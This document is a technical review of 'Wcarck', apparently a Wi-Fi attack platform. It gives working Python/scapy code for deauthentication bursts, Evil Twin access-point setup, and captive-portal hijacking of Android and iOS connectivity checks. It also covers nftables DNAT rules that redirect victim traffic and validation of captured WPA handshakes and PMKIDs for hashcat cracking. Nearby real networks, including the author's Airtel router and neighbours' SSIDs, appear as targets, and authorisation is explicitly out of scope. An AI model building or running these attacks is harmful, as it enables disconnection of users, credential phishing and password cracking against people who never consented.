# Wcarck — Deep Technical Engineering Review

**Scope:** Pure code/logic/architecture review. No auth, no legal, no compliance.  
**Based on:** Wcarck.md v0.1.5 + competitor_analysis.md v1.2

---

## 1. Driver Layer — Hardware-Specific Traps

### 1.1 rt2800usb (wlan_mon / Ralink) — burst injection will drop frames silently

The plan calls for a burst of 64 deauth frames in a tight loop. `rt2800usb` has a known USB
TX queue limit of ~8 frames before it starts silently dropping. At full Python speed in a
tight loop the driver will ACK the `sendp()` call but never actually put the frame on air.

**Fix:** Throttle with a small sleep between bursts — `await asyncio.sleep(0.001)` (1 ms)
between each frame. 64 frames at 1 ms = 64 ms burst, still faster than any AP can respond.
Verify with `iw dev wlan_mon station dump` — client should disappear within 1–2 bursts.

```python
# deauth/burst.py
async def burst_deauth(iface: str, bssid: str, client: str, count: int = 64):
    for seq in range(count):
        frame = RadioTap() / Dot11(
            addr1=client, addr2=bssid, addr3=bssid,
            SC=(seq << 4)
        ) / Dot11Deauth(reason=7)
        sendp(frame, iface=iface, verbose=False)
        await asyncio.sleep(0.001)   # <-- this is NOT optional
```

### 1.2 RTL8821AU (wlan_ap) — channel setting via nl80211 does not work in monitor mode

`iw dev wlan_ap set channel X` silently fails on the morrownr `88XXau` driver when the
interface is already in monitor mode. The nl80211 `SET_CHANNEL` command returns 0 (success)
but the radio does not change. The correct sequence is:

```bash
ip link set wlan_ap down
iw dev wlan_ap set channel <N>      # or: iw dev wlan_ap set freq <MHz>
ip link set wlan_ap up
```

The interface must be `DOWN` for the channel set to take effect. `pyroute2` wrapping of
`iw` does not help here — the driver enforces this at the nl80211 kernel level.

**Code implication:** `nl80211.py`'s `set_channel()` must bring the interface down, set
channel, bring it back up — not just issue `NL80211_CMD_SET_CHANNEL`.

### 1.3 RTL8821AU — 5 GHz DFS channels require passive scan first

The morrownr `88XXau` driver enforces DFS (Dynamic Frequency Selection) on channels
52–144. The interface cannot transmit on these channels without completing a 60-second
passive scan (CAC — Channel Availability Check). If `wlan_ap` tries to start hostapd on
channel 100 (5500 MHz) without CAC, hostapd exits with:

```
Could not set channel for kernel driver
```

**Fix:** Restrict the Evil Twin channel picker to non-DFS 5 GHz channels in the UI:
channels 36, 40, 44, 48 (UNII-1) and 149, 153, 157, 161, 165 (UNII-3). Mark
DFS channels with a warning or disable them. Add to `utils/channels.py`:

```python
DFS_CHANNELS_5GHZ = set(range(52, 145, 4))   # 52, 56, 60 ... 140, 144

def is_dfs(channel: int) -> bool:
    return channel in DFS_CHANNELS_5GHZ
```

### 1.4 mt7921e — do NOT set to monitor mode even temporarily

The plan correctly locks `wlan_uplink` to managed mode forever. But the code must
defend against this programmatically. Some pyroute2 code paths that enumerate all
interfaces and try to set them to monitor will crash the mt7921e driver on kernels < 6.4
with a kernel Oops. The `AdaptersModule` must have an explicit deny-list:

```python
PROTECTED_IFACES = {"wlan_uplink"}   # read from config

async def set_monitor(iface: str) -> None:
    if iface in PROTECTED_IFACES:
        raise ValueError(f"{iface} is protected and cannot change mode")
```

### 1.5 DKMS module — silent build failure is the #1 install bug

`install.sh` runs `sudo ./install-driver.sh NoPrompt` and then checks `modinfo 88XXau`.
But if `linux-headers-$(uname -r)` is not installed BEFORE the DKMS build, the build
fails silently (exit code 0, just a warning in dkms.log). `lsmod | grep 88XXau` returns
nothing but `install.sh` sees success.

**Fix:** Check DKMS build log explicitly:
```bash
dkms status 8821au | grep -E "installed|built" || {
  echo "[FAIL] 8821au DKMS build failed. Check /var/lib/dkms/8821au/*/build/make.log"
  exit 1
}
```

Also verify `linux-headers` version matches running kernel, not the latest installed
headers (mismatch is common after `apt upgrade` without reboot).

---

## 2. asyncio Correctness — Where the Plan's Patterns Will Break

### 2.1 scapy `sniff()` is BLOCKING — will freeze the event loop

The plan uses scapy for probe request harvesting and EAPOL parsing. `scapy.sniff()` is
a blocking call — it blocks the thread it runs on indefinitely. Calling it from an
`async def` coroutine will freeze the entire asyncio event loop for all other coroutines
(scan updates stop, WebSocket stops responding, job queue stops).

**Fix:** Use scapy's `AsyncSniffer`:
```python
from scapy.sendrecv import AsyncSniffer

class ProbeHarvester:
    def __init__(self, iface: str, queue: asyncio.Queue):
        self._sniffer = AsyncSniffer(
            iface=iface,
            prn=lambda pkt: asyncio.get_event_loop().call_soon_threadsafe(
                queue.put_nowait, pkt
            ),
            filter="type mgt subtype probe-req",
            store=False,
        )

    def start(self): self._sniffer.start()
    def stop(self): self._sniffer.stop()
```

`AsyncSniffer` runs in a background thread and uses `call_soon_threadsafe` to push
packets into the asyncio world safely. The coroutine then does `await queue.get()`.

### 2.2 pyroute2 IPRoute/NDB is synchronous — will block the event loop

`pyroute2.IPRoute()` and `pyroute2.NDB()` use blocking socket I/O under the hood.
Any call like `ipr.link("set", index=idx, state="up")` blocks the thread.

**Fix:** Wrap ALL pyroute2 calls in `run_in_executor`:
```python
import asyncio
from pyroute2 import IPRoute

async def set_iface_up(iface: str) -> None:
    loop = asyncio.get_running_loop()
    def _do():
        with IPRoute() as ipr:
            idx = ipr.link_lookup(ifname=iface)[0]
            ipr.link("set", index=idx, state="up")
    await loop.run_in_executor(None, _do)
```

This is not optional — pyroute2 calls during an Evil Twin mode switch will freeze
the WebSocket hub for ~100ms each, causing the progress bar in the UI to stutter.

### 2.3 subprocess stdout drain — the pipe deadlock that kills long captures

When spawning `airodump-ng` or `hcxdumptool` with `stdout=PIPE, stderr=PIPE` and
not actively draining both pipes, the subprocess will eventually block on a `write(2)`
syscall when the OS pipe buffer fills (typically 64 KB on Linux). The process appears
to hang. Since airodump-ng writes CSV continuously, 64 KB fills in about 30 seconds
of scanning a busy environment.

**Fix:** Drain stdout and stderr concurrently using `asyncio.gather`:
```python
class ManagedProcess:
    async def _drain_stdout(self):
        async for line in self.proc.stdout:
            await self._on_line(line.decode(errors="replace").strip())

    async def _drain_stderr(self):
        async for line in self.proc.stderr:
            pass  # or log to structlog at DEBUG level

    async def start(self, *args, **kwargs):
        self.proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            **kwargs
        )
        # MUST be started as tasks, not awaited — they run concurrently
        self._stdout_task = asyncio.create_task(self._drain_stdout())
        self._stderr_task = asyncio.create_task(self._drain_stderr())
```

Do NOT use `await self.proc.communicate()` for long-running processes — it accumulates
all output in memory and deadlocks on the same pipe-full condition.

### 2.4 Argon2 in async handler — blocks the event loop (keep even in MVP)

Even without auth, if you later use passlib/Argon2 for anything (e.g., verifying
the cracked password against a hash), calling `argon2.hash()` or `.verify()` directly
in an async handler blocks for ~200–500 ms. Always wrap in executor:

```python
result = await loop.run_in_executor(None, argon2_hasher.verify, hash, password)
```

---

## 3. Subprocess-Specific Behaviors (Tool-by-Tool)

### 3.1 hcxdumptool — IGNORES SIGINT, requires SIGTERM

The ManagedProcess sends SIGINT first, then SIGTERM after 2s. For hcxdumptool,
SIGINT is silently ignored on most versions (it traps the signal and continues
running to flush the pcapng file). The correct stop sequence for hcxdumptool is:

1. Send SIGTERM immediately (triggers pcapng flush + clean exit)
2. Wait up to 5s (file flush takes time — pcapng needs proper closing records)
3. SIGKILL if still alive

```python
# Override ManagedProcess for hcxdumptool
async def stop(self, grace: float = 5.0):
    if not self.proc or self.proc.returncode is not None:
        return
    self.proc.terminate()          # SIGTERM (not SIGINT) for hcxdumptool
    try:
        await asyncio.wait_for(self.proc.wait(), timeout=grace)
    except asyncio.TimeoutError:
        self.proc.kill()
        await self.proc.wait()
```

If you SIGKILL hcxdumptool, the output `.pcapng` file will be truncated and the
final frame records will be missing — your `.22000` export will be incomplete.

### 3.2 aireplay-ng — doesn't always exit on SIGINT when injecting at high rate

`aireplay-ng --deauth 0` (continuous) in some builds ignores SIGINT while mid-burst.
The signal is deferred until the current injection batch completes. At 64-frame bursts
this is usually fine, but with `--deauth 0` (infinite loop) the delay can be 2–3s.

**Fix:** Use `-deauth 50000` (a very large finite count) instead of `-deauth 0`.
This gives aireplay-ng a natural exit point and makes `--deauth` predictable.
When you want to stop, the ManagedProcess SIGINT will be received between batches.

### 3.3 hostapd startup — "AP-ENABLED" polling, not sleep

The plan's mode-switch diagram says "start hostapd (2s)". This is exactly the `sleep N`
anti-pattern the competitor analysis explicitly banned (Section 6, anti-pattern #5).

hostapd writes `AP-ENABLED` to its log when the AP is actually ready to accept clients.
Poll for it:

```python
async def wait_for_hostapd_ready(log_path: str, timeout: float = 10.0) -> bool:
    deadline = asyncio.get_event_loop().time() + timeout
    while asyncio.get_event_loop().time() < deadline:
        try:
            with open(log_path) as f:
                if "AP-ENABLED" in f.read():
                    return True
        except FileNotFoundError:
            pass
        await asyncio.sleep(0.1)
    return False
```

hostapd can be ready in 300 ms on fast hardware or take 4s on USB adapters
doing DFS scans. A fixed 2s is wrong in both directions.

### 3.4 dnsmasq — must not start before AP interface has an IP

dnsmasq binds to the interface specified by `interface=wlan_ap`. If it starts before
hostapd has fully initialized the interface (assigned the AP's static IP `10.0.0.1`),
dnsmasq exits with `FAILED to create listening socket for port 53: Address not available`.

**Fix:** After hostapd signals AP-ENABLED, poll for the IP:
```python
async def wait_for_iface_ip(iface: str, expected_ip: str, timeout: float = 5.0):
    import socket, struct
    deadline = asyncio.get_event_loop().time() + timeout
    while asyncio.get_event_loop().time() < deadline:
        # pyroute2 (in executor) or simple /proc/net/if_inet6 check
        addrs = await get_iface_addresses(iface)   # run_in_executor wrapper
        if expected_ip in addrs:
            return
        await asyncio.sleep(0.1)
    raise RuntimeError(f"{iface} never got IP {expected_ip}")
```

### 3.5 systemd-resolved port 53 conflict — hard blocker on Ubuntu 24.04

Ubuntu 24.04 LTS runs `systemd-resolved` with a stub listener on `127.0.0.53:53`
AND on `0.0.0.0:53` when `DNSStubListener=yes` (the default). dnsmasq will fail to
bind port 53 on the AP interface. This is silent — dnsmasq starts, logs "dnsmasq:
started", but has no DNS listener.

**Fix in install.sh:**
```bash
# Disable resolved DNS stub (keeps name resolution working via stub file)
sed -i 's/#DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
systemctl restart systemd-resolved
```

This must happen BEFORE dnsmasq is installed or it will claim port 53 at boot.

---

## 4. SQLAlchemy Async + SQLite Specifics

### 4.1 WAL mode must be explicitly enabled at connection time

The plan says "SQLite with WAL mode" but SQLite does not enable WAL by default.
You must issue the PRAGMA on every connection. With SQLAlchemy async + aiosqlite:

```python
from sqlalchemy.ext.asyncio import create_async_engine
from sqlalchemy import event, text

engine = create_async_engine(
    "sqlite+aiosqlite:////var/lib/wcarck/db.sqlite",
    connect_args={"check_same_thread": False},
)

@event.listens_for(engine.sync_engine, "connect")
def set_wal_mode(dbapi_conn, _):
    dbapi_conn.execute("PRAGMA journal_mode=WAL")
    dbapi_conn.execute("PRAGMA synchronous=NORMAL")   # faster, safe with WAL
    dbapi_conn.execute("PRAGMA foreign_keys=ON")      # enforce FKs
    dbapi_conn.execute("PRAGMA cache_size=-64000")    # 64 MB cache
```

Without `foreign_keys=ON`, all the `REFERENCES` constraints in the schema are silently
ignored — orphan rows accumulate without any error.

### 4.2 Scan update write storms will kill SQLite performance

`ScanModule` parses airodump-ng CSV output and updates the `networks` table. In a
busy RF environment this can fire 10–20 times per second per network seen. At 30
networks in view, that's 300–600 `UPDATE` statements per second against a single
SQLite WAL file. SQLite WAL mode allows concurrent reads but still serializes writes.
The event loop will be spending most of its time awaiting DB write locks.

**Fix:** Buffer scan updates in memory, flush to DB every 2 seconds:

```python
class ScanModule:
    _buffer: dict[str, NetworkUpdate] = {}
    _flush_interval = 2.0

    async def _on_csv_line(self, row: dict):
        self._buffer[row["bssid"]] = NetworkUpdate(**row)   # deduplicate by BSSID

    async def _flush_loop(self):
        while self._running:
            await asyncio.sleep(self._flush_interval)
            if self._buffer:
                batch = list(self._buffer.values())
                self._buffer.clear()
                async with session() as s:
                    await s.execute(
                        insert(Network).prefix_with("OR REPLACE"),
                        [n.dict() for n in batch]
                    )
```

The UI still gets live updates via the event bus (which is in-memory and fires
immediately) — the DB flush is just for persistence.

### 4.3 SQLite partial unique index — SQLAlchemy syntax trap

The schema has:
```sql
UNIQUE(active) WHERE active = 1   -- only one active scope
```

SQLAlchemy 2.0 does NOT support this via `UniqueConstraint`. Use:

```python
from sqlalchemy import Index, text

Index(
    "uq_one_active_scope",
    Scope.active,
    unique=True,
    sqlite_where=text("active = 1"),
)
```

Without this, `UniqueConstraint("active")` creates a constraint that prevents
having both `active=0` and `active=0` simultaneously — meaning only ONE scope
can ever be inactive. This is the opposite of what you want.

### 4.4 `attack_sessions` / `job_queue` status duplication

As noted in the earlier review — but now the engineering consequence:
If `attack_sessions.status` diverges from `job_queue.status` (e.g., a crash
mid-job), any query that JOINs both tables will produce contradictory results.
The frontend showing "running" from `attack_sessions` while `job_queue` says
"failed" will confuse the operator.

**Concrete fix:** Remove `status`, `started_at`, `ended_at`, `error_msg` from
`attack_sessions`. Add `job_id INTEGER NOT NULL REFERENCES job_queue(id)` as
the only lifecycle reference. Derive all status from `job_queue`.

---

## 5. EventBus Implementation Traps

### 5.1 `_subs` dict mutation during fan-out — asyncio concurrency bug

The EventBus iterates `self._subs[event.tag]` during `publish()`. If another
coroutine calls `subscribe()` or the WebSocket handler disconnects (removing its
queue from `_subs`) while `publish()` is mid-iteration, you get:

```
RuntimeError: dictionary changed size during iteration
```

This is a real asyncio bug — a coroutine can yield inside `publish()` (at the
`try: q.put_nowait(event)` line if a lock is involved), giving another coroutine
a chance to modify `_subs`.

**Fix:** Iterate a snapshot:
```python
async def publish(self, event: Event) -> None:
    self._ring.append(event)
    listeners = list(self._subs.get(event.tag, []))   # snapshot
    for q in listeners:
        try:
            q.put_nowait(event)
        except asyncio.QueueFull:
            pass   # slow consumer, drop
```

Also: separate `asyncio.Lock` for `_ring` is overkill (deque append is atomic
in CPython due to GIL — and asyncio is single-threaded). Remove the lock.

### 5.2 Ring buffer wraps too fast during active scan

10,000 events at ~50 events/second (scan + deauth active) = **200 seconds** of
history. During an Evil Twin session with 5 clients and constant probe activity,
you can hit 200+ events/second, filling the ring in 50 seconds.

On a React tab refresh after 50 seconds, `GET /api/events?from=N` returns nothing
useful because the ring has wrapped. The UI shows stale state.

**Fix:** Increase `ring_size` to 100,000 (still only ~50 MB RAM at ~500 bytes/event)
OR implement a "session snapshot" endpoint that returns the current state (all
networks, all clients, all jobs) regardless of event history — use this for tab
refresh, not event replay.

### 5.3 `on_event` subscription model — don't subscribe all modules to all events

The Module protocol has `async def on_event(self, event: Event) -> None`. If the
registry calls `on_event` on every registered module for every event, and there
are 10 modules:

- 50 events/sec × 10 modules = 500 coroutine dispatches/sec
- Each dispatch is a task creation + scheduling overhead
- At heavy scan load (200 events/sec) → 2,000 task creates/sec

Python asyncio task creation is ~1–5 µs each. 2,000/sec = ~2–10 ms/sec overhead.
Acceptable, BUT: modules that don't handle a particular event tag still get called,
allocate the coroutine frame, check the tag, and return immediately. Wasteful.

**Fix:** Modules declare which event tags they handle via a `subscriptions: list[str]`
class variable. The registry only dispatches to modules that declared interest:

```python
class DeauthModule(Module):
    subscriptions = ["capture.handshake.got", "adapter.status"]
    # NOT called for "scan.network" events
```

---

## 6. RadioLeaseManager Implementation Traps

### 6.1 Global lock serializes ALL adapters — wrong

If `RadioLeaseManager` uses a single `asyncio.Lock` for all lease operations, then
acquiring a lease on `wlan_mon` blocks `wlan_ap` lease requests even though they're
completely independent adapters.

**Fix:** Per-adapter lock:
```python
class RadioLeaseManager:
    def __init__(self):
        self._adapter_locks: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)
        self._active_leases: dict[str, Lease] = {}

    async def acquire(self, adapter_mac: str, lease_type: str, job_id: int) -> Lease:
        async with self._adapter_locks[adapter_mac]:
            existing = self._active_leases.get(adapter_mac)
            if existing and self._conflicts(existing.lease_type, lease_type):
                raise ResourceBusy(adapter_mac, existing)
            lease = Lease(adapter_mac, lease_type, job_id)
            self._active_leases[adapter_mac] = lease
            return lease
```

### 6.2 Lease orphaning on process restart

If the wcarck service crashes mid-job, `resource_leases` rows remain with
`status='active'` but no live job exists. On restart, the lease manager loads
stale active leases from the DB and refuses all new lease requests ("adapter busy").

**Fix:** On startup, set all `active` leases to `orphaned` and release them:
```python
async def startup_cleanup(session: AsyncSession):
    await session.execute(
        update(ResourceLease)
        .where(ResourceLease.status == "active")
        .values(status="orphaned", released_at=datetime.utcnow())
    )
    await session.commit()
    # Also reset any adapters still in monitor mode from the previous session
    for iface in ["wlan_mon", "wlan_ap"]:
        try:
            await set_managed_mode(iface)
        except Exception:
            pass   # best-effort cleanup
```

---

## 7. Scapy Injection — What the Plan Doesn't Say

### 7.1 Radiotap header is MANDATORY for injection

`scapy.sendp(Dot11(...))` on a monitor-mode interface without a `RadioTap()` header
returns successfully (no Python error) but the kernel's mac80211 layer silently
drops the frame — nothing goes on air.

The correct deauth frame structure:
```python
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

frame = (
    RadioTap()                    # <-- REQUIRED, auto-filled by kernel
    / Dot11(
        type=0, subtype=12,       # management, deauth
        addr1=client_mac,         # destination (STA being kicked)
        addr2=ap_bssid,           # source (spoofed as AP)
        addr3=ap_bssid,           # BSSID
        SC=(seq_num << 4),
    )
    / Dot11Deauth(reason=7)
)
sendp(frame, iface="wlan_mon", verbose=False, count=1)
```

AND send in the opposite direction (STA→AP) to ensure both sides disassociate:
```python
frame_sta = (
    RadioTap()
    / Dot11(
        type=0, subtype=12,
        addr1=ap_bssid,           # destination (AP)
        addr2=client_mac,         # source (spoofed as STA)
        addr3=ap_bssid,
        SC=((seq_num + 1) << 4),
    )
    / Dot11Deauth(reason=7)
)
```

### 7.2 PMF / 802.11w — deauth will silently fail on modern WPA2 APs

Modern routers (post-2019) increasingly ship with **Management Frame Protection
Capable (MFPC)** enabled by default. Xiaomi, TP-Link AX series, Airtel-supplied
routers — the user's `NASA` is a Bharti Airtel router which very likely has PMF
enabled. The STA's 4-way handshake will include the PMF negotiation, and deauth
frames that don't have a valid MIC (Message Integrity Code) are silently dropped.

**Detection:** Parse the beacon frame's RSN IE:
```python
def has_pmf(beacon_pkt) -> tuple[bool, bool]:
    """Returns (MFPC, MFPR) — Capable, Required"""
    rsn = beacon_pkt.getlayer(Dot11Elt, ID=48)   # RSN IE = 48
    if not rsn:
        return False, False
    rsn_info = parse_rsn_ie(rsn.info)
    caps = rsn_info.get("rsn_capabilities", 0)
    mfpr = bool(caps & 0x0040)   # bit 6 = MFP Required
    mfpc = bool(caps & 0x0080)   # bit 7 = MFP Capable
    return mfpc, mfpr
```

**If PMF is detected:** Display a warning in the UI. The deauth button can still
be clicked (for non-PMF clients on the same AP) but the operator should know that
PMF-enabled clients will NOT be deauthenticated.

There is NO workaround for PMF deauth without the AP's PTK (Pairwise Transient Key).
This is a hard RF limitation, not a software bug.

### 7.3 Reason code 7 is wrong for broadcast deauth

Reason code 7 ("Class 3 frame received from nonassociated STA") is the correct reason
for AP→STA unicast deauth when the STA is no longer associated. But for **broadcast
deauth** (`addr1=ff:ff:ff:ff:ff:ff` to kick all clients at once), reason code 7 is
semantically incorrect and some firmware rejects it. Use:

- **Reason 1** (Unspecified) for broadcast deauth
- **Reason 7** for unicast deauth of a specific STA

---

## 8. Captive Portal — Android/iOS Detection Logic

### 8.1 Android CNA — the correct HTTP response is NOT a redirect

The plan points `connectivitycheck.gstatic.com` to a real Google IP (172.217.5.78)
in dnsmasq. But Android verifies the connectivity check by expecting HTTP 204 No Content
from `gstatic.com`. If it gets a 200 with the portal HTML, the Android CNA (Captive
Network Assistant) shows "Sign in to WiFi" notification. If it gets a connection timeout
or a TLS error, Android shows "Connected, no internet" with NO notification — the user
never sees the portal prompt.

The nftables DNAT rule intercepts the HTTP request to `connectivitycheck.gstatic.com`.
The portal server at `10.0.0.1` must handle this URL specifically:

```python
@portal_app.route("/generate_204")
async def android_captive_check(request):
    # Return 302 to trigger the CNA portal popup
    return web.HTTPFound(location="http://10.0.0.1/")

@portal_app.route("/gen_204")
async def android_captive_check_alt(request):
    return web.HTTPFound(location="http://10.0.0.1/")
```

The 302 redirect is the correct response — Android follows it and shows the portal
in the CNA popup (not the full browser). The captive portal HTML must be designed to
fit in the CNA popup viewport (roughly 360×600 px).

### 8.2 iOS CNA — apple.com URLs not in the dnsmasq config

iOS checks `captive.apple.com/hotspot-detect.html` and `www.apple.com/library/test/success.html`.
The plan's dnsmasq config has no entries for `apple.com`. Without them, iOS either:
- Shows "No Internet Connection" (if TLS cert doesn't match), OR
- Never triggers the captive portal popup (user must manually open Safari)

**Fix:** Add to dnsmasq config template:
```
address=/captive.apple.com/10.0.0.1
address=/www.apple.com/10.0.0.1
address=/apple.com/10.0.0.1
```

And handle in the portal server:
```python
APPLE_DETECT_PATHS = {"/hotspot-detect.html", "/library/test/success.html"}

@portal_app.middleware
async def apple_captive_middleware(request, handler):
    if request.path in APPLE_DETECT_PATHS:
        return web.Response(
            text="<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>",
            content_type="text/html",
            status=200,   # First response: success (so iOS trusts the AP)
        )
        # Then on subsequent checks, redirect to portal
    return await handler(request)
```

iOS captive portal behavior is complex — it runs a multi-stage check. Getting it wrong
means the iOS user never sees the portal popup and has to manually navigate.

### 8.3 HTTPS on port 443 — must be handled or HSTS breaks everything

Modern browsers have HSTS (HTTP Strict Transport Security) preloaded for major sites.
When a client connected to the Evil Twin tries to load `https://google.com`, the
browser enforces HTTPS regardless of any redirect. The nftables DNAT of port 443
sends the TLS ClientHello to the aiohttp portal server which has no TLS — the
connection is reset. The browser shows a "Privacy Error" page, not the portal.

**Fix options (in order of implementation cost):**
1. **Minimal TLS server on 443:** Generate a self-signed cert, serve it on 443, return
   a 302 to `http://10.0.0.1/`. The browser shows a cert warning but then shows the
   portal. Acceptable for Evil Twin.
2. **TCP RST port 443 at nftables level:** Better UX — the HTTPS connection immediately
   fails and the CNA popup appears instead.
3. **Just document it:** Most phones use the CNA popup (HTTP 302) and don't need
   direct browser HTTPS navigation to the portal.

---

## 9. nftables — Logic Issues in the Plan

### 9.1 Table vs. chain naming inconsistency

The plan uses both:
- `nft add chain inet wcarck et_<id>` (chains in a shared `wcarck` table)
- `nft add table inet wcarck_et_<id>` (separate table per session)

These are different structures. **Use separate tables** (`inet wcarck_et_<id>`):
- Teardown is `nft delete table inet wcarck_et_<id>` — removes ALL chains + rules atomically
- No risk of a teardown bug leaving orphan rules in a shared table
- No priority conflicts between sessions

```python
# portal/nftables.py
TABLE_NAME = "wcarck_et_{session_id}"

SETUP_SCRIPT = """
nft add table inet {table}
nft add chain inet {table} prerouting {{ type nat hook prerouting priority -100; policy accept; }}
nft add chain inet {table} postrouting {{ type nat hook postrouting priority 100; policy accept; }}
nft add rule inet {table} prerouting iifname "{ap_iface}" tcp dport {{ 80, 443, 8080 }} dnat to {portal_ip}
nft add rule inet {table} prerouting iifname "{ap_iface}" udp dport 53 dnat to {portal_ip}
"""

TEARDOWN_SCRIPT = "nft delete table inet {table}"
```

### 9.2 ExcludeAddress — prevent the portal IP from looping

If the portal server itself makes an outbound HTTP request (e.g., for aircrack-ng
validation which is a subprocess, so fine — but future additions could), and the
nftables rule DNATs ALL traffic from `wlan_ap`, the portal's own requests loop back
to itself. The bettercap pattern (ExcludeAddress) is:

```
# Exclude the portal IP itself from DNAT redirection
nft add rule inet {table} prerouting iifname "{ap_iface}" ip saddr {portal_ip} accept
```

Place this rule BEFORE the DNAT rules (nftables evaluates rules in order).

---

## 10. Algorithm / Logic Flaws

### 10.1 4-EAPOL validator has a PMKID blind spot

The wifite2 4-EAPOL state machine (`tools/tshark.py`) validates EAPOL M1/M2/M3/M4.
But hcxdumptool `.22000` files contain BOTH PMKID hashes AND EAPOL hashes in the
same file (different line prefixes: `WPA*01` for PMKID, `WPA*02` for EAPOL).

If only a PMKID was captured (no connected client was present to complete the
4-way handshake), the 4-EAPOL validator will report `valid=False`. But the file IS
crackable by hashcat `-m 22000` using the PMKID line.

**Fix:** The validator must check for PMKID records separately:
```python
def validate_22000_file(path: str) -> ValidationResult:
    pmkid_lines = []
    eapol_lines = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line.startswith("WPA*01"):    # PMKID record
                pmkid_lines.append(line)
            elif line.startswith("WPA*02"):  # EAPOL record
                eapol_lines.append(line)

    has_pmkid = len(pmkid_lines) > 0
    has_eapol = validate_eapol_state_machine(eapol_lines)   # wifite2 logic
    return ValidationResult(
        valid=has_pmkid or has_eapol,
        type="pmkid" if has_pmkid and not has_eapol else "eapol",
        crack_ready=has_pmkid or has_eapol,
    )
```

### 10.2 airodump-ng CSV parser — UTF-8 / latin-1 encoding trap

airodump-ng writes CSV output in the system locale encoding, which is typically
`UTF-8` on Ubuntu 24.04 but the tool itself may emit SSIDs in `latin-1` if the AP
beacon contained non-UTF-8 bytes. The user's scan environment includes SSIDs with
non-ASCII characters (`AdityaÂ°Z` is mangled UTF-8, `Jai shree Ram` may have
Devanagari in real beacons).

`line.decode("utf-8")` will raise `UnicodeDecodeError` and crash the CSV parser.

**Fix:**
```python
line.decode("utf-8", errors="replace")
# OR use chardet/charset-normalizer for detection
```

Also: the SSID field in airodump CSV is space-padded and may contain embedded commas
(CSVs don't escape these). Use Python's `csv` module with `quotechar='"'` and
`skipinitialspace=True`, not a naive `line.split(",")`.

### 10.3 Channel hopper vs. airodump-ng — they fight

`ScanModule` wraps airodump-ng which has its own built-in channel hopper (`--hop` flag,
default enabled). If `AdaptersModule` ALSO tries to hop channels on `wlan_mon` via
pyroute2 while airodump-ng is running, the two compete:
- airodump sets channel 6
- Wcarck sets channel 1
- airodump sets channel 11
- Wcarck sees channel 1 in the lease and tries to lock it

**Fix:** When `ScanModule` is running with `monitor.scan` lease on an adapter, all
`AdaptersModule` channel-set operations on that adapter must return a conflict error.
Let airodump own the channel during scan. Only `DeauthModule` (with `monitor.locked`)
should manually set channel.

### 10.4 Job priority queue — direction not defined

The schema has `priority INTEGER NOT NULL DEFAULT 100` in `job_queue`. The bounded
async worker pool dequeues jobs, but which direction is higher priority — lower
integer or higher integer?

Without a defined convention, the first developer writes ascending (100 = normal,
50 = high) and the second writes descending (100 = normal, 150 = high). The UI
"priority" label becomes meaningless.

**Define now:**
```python
class JobPriority(IntEnum):
    CRITICAL = 10    # adapter teardown/cleanup
    HIGH     = 30    # stop commands
    NORMAL   = 50    # user-initiated attacks
    LOW      = 80    # background scan
    BATCH    = 100   # crack jobs
```

Lower integer = higher priority (dequeued first). Document in `orchestration/jobs.py`.

### 10.5 Teardown stack — coroutine vs. coroutine function confusion

If teardown callbacks are registered as coroutines (already-called async functions),
they can only be awaited once. If they're registered as coroutine functions (the `async def`
callable itself), they must be called to get a coroutine before awaiting.

The Python mistake:
```python
# BUG: registers the coroutine object, not the function
teardown.push(restore_managed_mode(iface))   # coroutine already started

# CORRECT: register a callable, call it during teardown
teardown.push(lambda: restore_managed_mode(iface))
```

The teardown stack should store `Callable[[], Awaitable[None]]` and call each
during teardown:
```python
class TeardownStack:
    _stack: list[Callable[[], Awaitable]] = []

    def push(self, coro_func: Callable[[], Awaitable]) -> None:
        self._stack.append(coro_func)

    async def run(self) -> None:
        errors = []
        for coro_func in reversed(self._stack):
            try:
                await coro_func()
            except Exception as e:
                errors.append(e)   # don't stop teardown on first error
        if errors:
            raise ExceptionGroup("teardown errors", errors)
```

---

## 11. Frontend Engineering Traps

### 11.1 Zustand + WebSocket — re-render storm on scan updates

If the WS hook calls `useScanStore.setState({ networks: newList })` on every
`scan.network` event and `newList` is a new array object every time, React will
re-render ALL components that consume the `networks` array — including the full
TanStack Table — on every airodump CSV parse cycle (every ~2 seconds, but potentially
more often in a busy environment).

**Fix:** Use Zustand's `immer` middleware to do structural updates:
```typescript
// stores/scan.ts
import { produce } from 'immer'

const useScanStore = create<ScanState>()(
  immer((set) => ({
    networks: {} as Record<string, Network>,   // keyed by BSSID, not an array
    updateNetwork: (n: Network) =>
      set((state) => { state.networks[n.bssid] = n }),   // only mutates one entry
  }))
)
```

With `networks` as a record (not an array), a single BSSID update mutates one
key and React only re-renders components subscribing to that specific BSSID.

### 11.2 TanStack Table — add virtualization from day one

With 50+ networks in the scan table, TanStack Table renders 50 `<tr>` DOM nodes.
Each `scan.network` event updates one row, but React reconciles the full table.
At 2 updates/second across 50 networks → 100 reconciliations/second → jank.

Add `@tanstack/react-virtual` from Phase 2 (not Phase 5):
```typescript
import { useVirtualizer } from '@tanstack/react-virtual'
```

This is a one-time 30-minute addition that prevents the table from becoming the
dominant perf bottleneck during demos.

### 11.3 WebSocket reconnect — exponential backoff with jitter

The reconnect must have jitter, not just backoff. Without jitter, if the service
restarts and 3 browser tabs all reconnect at the same time (e.g., after `systemctl
restart wcarck`), they pile up on the FastAPI WebSocket upgrade handler simultaneously.

```typescript
// lib/ws.ts
function reconnectDelay(attempt: number): number {
  const base = Math.min(1000 * 2 ** attempt, 16000)   // 1s, 2s, 4s, 8s, 16s max
  const jitter = Math.random() * 1000
  return base + jitter
}
```

### 11.4 `Crack.tsx` route is missing from the frontend structure

The Phase 6 crack API is fully specified (all `/api/crack/*` endpoints, all
`crack.job.*` WS events). But there's no `Crack.tsx` route in Section 8.
Add it now as a placeholder — even a `<ComingSoon />` component — so the nav
sidebar doesn't need structural changes in Phase 6.

---

## 12. System-Level Issues

### 12.1 `CAP_SYS_ADMIN` in production service — too broad

`CAP_SYS_ADMIN` grants ~40 different kernel capabilities including mounting
filesystems and loading kernel modules. The service needs only:
- `CAP_NET_RAW` — scapy raw socket injection
- `CAP_NET_ADMIN` — nl80211 mode switching, nft, macchanger

